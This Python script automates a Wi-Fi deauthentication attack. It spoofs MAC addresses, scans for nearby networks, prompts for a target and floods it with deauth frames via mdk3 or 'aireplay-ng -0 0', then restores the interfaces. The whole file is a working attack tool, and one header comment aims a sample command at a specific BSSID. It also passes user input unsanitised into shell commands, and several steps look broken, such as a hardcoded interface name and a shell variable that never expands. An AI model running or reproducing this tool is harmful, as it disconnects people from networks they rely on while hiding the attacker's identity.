import os
import sys
import string
#########################
#ver:0.1b
#aireplay-ng -0 0 -a CC:B2:55:FD:41:DA wlan0mon
#mdk3 wlan0mon d -n "Hooop"
#| awk '{print FS2 $2}
#| sed '/$choose/p; d'
#nmcli -f NAME,BSSID,CHAN,RATE,SIGNAL,SECURITY,SSID, dev wifi list ifname $card | awk '{print FS2 $2}' | sed '2p; d' (BSSID)
#nmcli -f NAME,BSSID,CHAN,RATE,SIGNAL,SSID, dev wifi list ifname $card | awk '{print FS2 $7}' | sed '2p; d' (ESSID)
#nmcli -f NAME,BSSID,CHAN,RATE,SIGNAL,SSID, dev wifi list ifname wlan1 | awk '{print FS3 $3}' | sed '2p; d' (CHANNEL)
###########################


print("Check dependencies: ")
print("")

os.system('test /usr/bin/python  && echo "[+] Python ok" || apt-get -y install python')
os.system('test /usr/bin/mdk3 && echo "[+] Mdk3 ok" || apt-get -y install mdk3')
os.system('test /usr/bin/nmcli && echo "[+] Nmcli ok" || apt-get -y install nmcli')
os.system('test /usr/bin/aircrack-ng && echo "[+] Aircrack-ng ok" || apt-get -y install aircrack-ng')
os.system('test /usr/bin/macchanger && echo "[+] MacChanger ok" || apt-get -y install macchanger')
print("")


os.system('clear')
print("Listing Wireless extensions: ")
os.system("ifconfig | grep -e ': ' | sed -e 's/: .*//g' | sed -e 's/^//' > card.txt && cat -n card.txt")
print("")


wlancarda = raw_input("Please select one Attack extension: ")
os.system('cat card.txt | grep -n ^ | grep '+wlancarda+' | cut -d: -f2 > carda.sh')
print("")
os.system('cat carda.sh && echo "#############################################################"')
os.system('clear')

print("Listing Wireless extensions: ")
os.system("ifconfig | grep -e ': ' | sed -e 's/: .*//g' | sed -e 's/^//' > card.txt && cat -n card.txt")
print("")


wlancardm = raw_input("Please select one Monitor extension: ")
os.system('cat card.txt | grep -n ^ | grep '+wlancardm+' | cut -d: -f2 > cardm.sh')
print("")
os.system('cat cardm.sh && echo "#############################################################"')
os.system('clear')


print("Changing the mac addrrs: ")
os.system('card=`cat carda.sh` &&  ifconfig $card down && macchanger -r $card && ifconfig $card up')
os.system('card=`cat cardm.sh` &&  ifconfig $card down && macchanger -r $card && ifconfig $card up')
print("")

print("Chose the way for deauth attack: ")
os.system('test /usr/bin/mdk3 && echo "1: [+] Mdk3 ok" || echo "1: [!] Mdk3 off"')
os.system('test /usr/bin/aircrack-ng && echo "2: [+] Aircrack-ng ok" || echo "1: [!] Aireplay-ng off"')
way = int(raw_input("Please Select or install manualy if your choose is off!: "))
print("")
print("")
os.system('clear')


print("Detecting Wireless Networks: ")
os.system('card=`cat cardm.sh` && airodump-ng $card')
os.system('card=`cat cardm.sh` && nmcli dev wifi rescan ifname $card')
os.system('card=`cat cardm.sh` && nmcli -f NAME,BSSID,CHAN,RATE,SIGNAL,SECURITY,SSID, dev wifi list ifname $card')
print("[0] to reescan")

choo = int(raw_input("Choose the wifi to attack: "))
choose=(choo+1)
os.system('echo "'+str(choose)+'" > choose')
os.system("card=`cat cardm.sh` && choose=`cat choose` && nmcli -f NAME,BSSID,CHAN,RATE,SIGNAL,SSID, dev wifi list ifname $card | awk '{print FS3 $3}' | sed '/$choose/p; d' > chan")
print("")

if way == 1:
  os.system("card=`cat cardm.sh` && choose=`cat choose` && nmcli -f NAME,BSSID,CHAN,RATE,SIGNAL,SSID, dev wifi list ifname wlan1 | awk '{print FS2 $7}' | sed '/$choose/p; d' > targ")
  os.system('card=`cat carda.sh` && airmon-ng start $card')
  
  os.system('card=`cat carda.sh`mon && target=`cat targ` && mdk3 $card d -n "$target"')
  print("Wait..")
  os.system('card=`cat carda.sh`mon && airmon-ng stop $card')
else:
  os.system("card=`cat cardm.sh` && choose=`cat choose` && nmcli -f NAME,BSSID,CHAN,RATE,SIGNAL,SSID, dev wifi list ifname wlan1 | awk '{print FS2 $2}' | sed '2p; d' > targ")
  os.system('card=`cat carda.sh` && ch=`cat chan` && airmon-ng start $card $ch')
  
  os.system('card=`cat carda.sh`mon && target=`cat targ` && aireplay-ng -0 0 -a $target  $card')
  print("Wait..")
  os.system('card=`cat carda.sh`mon && airmon-ng stop $card')
  
  
  
print("")  
print("")
print("Return configurations: ")
os.system('rm choose && rm chan && rm card.* && rm targ')
os.system('card=`cat carda.sh` && ifconfig $card down && macchanger -p $card && ifconfig $card up')
os.system('card=`cat cardm.sh` && ifconfig $card down && macchanger -p $card && ifconfig $card up')
os.system('service network-manager restart')
